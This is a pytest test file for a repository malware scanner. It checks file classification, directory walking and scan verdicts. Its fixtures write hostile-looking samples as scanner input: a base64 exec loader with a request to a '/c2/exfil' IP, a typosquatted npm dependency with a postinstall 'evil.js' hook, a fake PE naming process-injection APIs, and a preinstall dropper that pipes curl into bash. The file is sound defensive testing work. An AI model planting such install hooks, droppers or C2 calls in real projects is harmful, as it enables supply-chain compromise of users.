from __future__ import annotations

from pathlib import Path

import pytest

from security_scanner.models import FileClassification, VerdictState
from security_scanner.repo_scanner import RepoScanner, classify_file, walk_repo


# -- classify_file --

def test_classify_py_as_source():
    assert classify_file(Path("script.py")) == FileClassification.SOURCE


def test_classify_exe_as_binary():
    assert classify_file(Path("malware.exe")) == FileClassification.BINARY


def test_classify_json_as_config():
    assert classify_file(Path("package.json")) == FileClassification.CONFIG


def test_classify_sh_as_script():
    assert classify_file(Path("setup.sh")) == FileClassification.SCRIPT


def test_classify_unknown_extension():
    assert classify_file(Path("readme.xyz")) == FileClassification.UNKNOWN


def test_classify_binary_by_magic():
    assert classify_file(Path("noext"), data=b"MZ\x90\x00") == FileClassification.BINARY


def test_classify_shebang_as_script():
    assert classify_file(Path("run"), data=b"#!/usr/bin/env python3\n") == FileClassification.SCRIPT


# -- walk_repo --

def test_walk_skips_git_dir(tmp_path):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("git config")
    (tmp_path / "main.py").write_text("print('hello')")
    results = walk_repo(tmp_path)
    paths = [str(p.name) for p, _ in results]
    assert "main.py" in paths
    assert "config" not in paths


def test_walk_skips_node_modules(tmp_path):
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "lodash.js").write_text("module.exports = {}")
    (tmp_path / "index.js").write_text("console.log('hi')")
    results = walk_repo(tmp_path)
    paths = [str(p.name) for p, _ in results]
    assert "index.js" in paths
    assert "lodash.js" not in paths


def test_walk_respects_max_files(tmp_path):
    for i in range(20):
        (tmp_path / f"file_{i}.py").write_text(f"# file {i}")
    results = walk_repo(tmp_path, max_files=5)
    assert len(results) == 5


def test_walk_skips_empty_files(tmp_path):
    (tmp_path / "empty.py").write_text("")
    (tmp_path / "real.py").write_text("x = 1")
    results = walk_repo(tmp_path)
    paths = [str(p.name) for p, _ in results]
    assert "empty.py" not in paths
    assert "real.py" in paths


# -- RepoScanner.scan --

@pytest.mark.asyncio
async def test_scan_clean_repo(tmp_path):
    (tmp_path / "main.py").write_text("def hello():\n    print('Hello')\n")
    (tmp_path / "util.py").write_text("def add(a, b):\n    return a + b\n")

    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    assert report.file_count == 2
    assert report.aggregate_verdict in (VerdictState.CLEAN, VerdictState.INCONCLUSIVE)


@pytest.mark.asyncio
async def test_scan_malicious_source_repo(tmp_path):
    (tmp_path / "loader.py").write_text('''
import subprocess, socket
exec(base64.b64decode("aGVsbG8gd29ybGQ="))
requests.get("http://45.33.32.156/c2/exfil")
''')
    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    assert report.aggregate_verdict in (VerdictState.SUSPICIOUS, VerdictState.MALICIOUS)
    assert report.statistics["high_findings"] >= 1


@pytest.mark.asyncio
async def test_scan_malicious_deps(tmp_path):
    (tmp_path / "package.json").write_text('{"dependencies": {"expresss": "^4.0.0"}, "scripts": {"postinstall": "node evil.js"}}')

    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    assert report.aggregate_verdict in (VerdictState.SUSPICIOUS, VerdictState.MALICIOUS)
    high_obs = [o for o in report.top_findings if o.severity.value in ("high", "critical")]
    assert len(high_obs) >= 1


@pytest.mark.asyncio
async def test_scan_with_binary(tmp_path):
    pe_data = b"MZ" + b"\x00" * 64 + b"CreateRemoteThread" + b"WriteProcessMemory" + b"\x00" * 256
    (tmp_path / "payload.exe").write_bytes(pe_data)
    (tmp_path / "readme.txt").write_text("Just a readme")

    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    assert report.statistics["binaries"] == 1
    assert len(report.binary_verdicts) == 1


@pytest.mark.asyncio
async def test_scan_report_json_serializable(tmp_path):
    (tmp_path / "test.py").write_text("print('hello')")
    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    json_str = report.model_dump_json()
    assert len(json_str) > 0
    import json
    parsed = json.loads(json_str)
    assert parsed["repo_path"] == str(tmp_path)


@pytest.mark.asyncio
async def test_scan_mixed_classifications(tmp_path):
    (tmp_path / "app.py").write_text("import flask")
    (tmp_path / "config.yaml").write_text("key: value")
    (tmp_path / "deploy.sh").write_text("#!/bin/bash\necho deploy")
    (tmp_path / "data.bin").write_bytes(b"\x00" * 100)

    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    classifications = {f.classification for f in report.files}
    assert FileClassification.SOURCE in classifications
    assert FileClassification.CONFIG in classifications
    assert FileClassification.SCRIPT in classifications


@pytest.mark.asyncio
async def test_scan_preinstall_dropper_correlation(tmp_path):
    """Shai-Hulud pattern: preinstall hook → dropper that downloads + executes."""
    (tmp_path / "package.json").write_text('{"scripts": {"preinstall": "node setup.js"}}')
    (tmp_path / "setup.js").write_text("""
const { execSync, spawn } = require('child_process');
execSync('curl -fsSL https://bun.sh/install | bash');
spawn('bun', ['payload.js']);
""")
    scanner = RepoScanner(settings=_test_settings(tmp_path))
    report = await scanner.scan(tmp_path)

    assert report.aggregate_verdict == VerdictState.MALICIOUS
    high_obs = [o for o in report.top_findings if o.severity.value in ("high", "critical")]
    assert any("preinstall_dropper" in o.category for o in high_obs)


def _test_settings(tmp_path):
    from security_scanner.config import Settings
    return Settings(
        artifact_dir=tmp_path / "_artifacts",
        runtime_dir=tmp_path / "_runtime",
        state_file=tmp_path / "_runtime" / "state.json",
    )
